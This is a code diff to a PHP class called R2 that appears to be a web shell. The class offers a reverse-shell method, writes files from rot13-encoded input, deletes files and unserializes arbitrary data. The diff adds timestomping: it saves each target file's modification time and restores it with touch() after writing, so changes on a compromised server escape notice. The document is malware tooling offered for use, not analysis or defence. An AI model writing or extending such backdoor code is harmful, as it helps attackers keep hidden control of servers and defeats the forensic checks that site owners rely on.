@@ -39,6 +39,7 @@ class R2
         error_log($debug);
         set_time_limit($time);
         $this->cwd = getcwd() . DIRECTORY_SEPARATOR;
+        $this->cft = time();
     }
     public function reverse(string $host, int $port)
     {
@@ -145,9 +146,13 @@ class R2
     {
         $file = str_rot13(urldecode($file));
         if (substr($this->cwd, -1) == DIRECTORY_SEPARATOR) {
-            return file_put_contents($this->cwd . $name, $file);
+            $this->changeTime($this->cwd . $name);
+            file_put_contents($this->cwd . $name, $file);
+            return touch($this->cwd . $name, $this->cft);
         } else {
-            return file_put_contents($this->cwd . DIRECTORY_SEPARATOR . $name, $file);
+            $this->changeTime($this->cwd . DIRECTORY_SEPARATOR . $name);
+            file_put_contents($this->cwd . DIRECTORY_SEPARATOR . $name, $file);
+            return touch($this->cwd . DIRECTORY_SEPARATOR, $this->cft);
         }
     }
     /*
@@ -265,7 +270,7 @@ class R2
             return unlink($this->cwd . DIRECTORY_SEPARATOR . $file) . PHP_EOL;
         }
     }
-    public function serial($data)
+    public function serial(string $data)
     {
         return unserialize($data) . PHP_EOL;
     }
@@ -273,6 +278,10 @@ class R2
     {
         $this->cwd = $this->cwd . $directory;
         chdir($this->cwd);
+    }
+    public function changeTime($file)
+    {
+        $this->cft = filemtime($file);
     }
 }
 $r2 = new R2(true, 0);
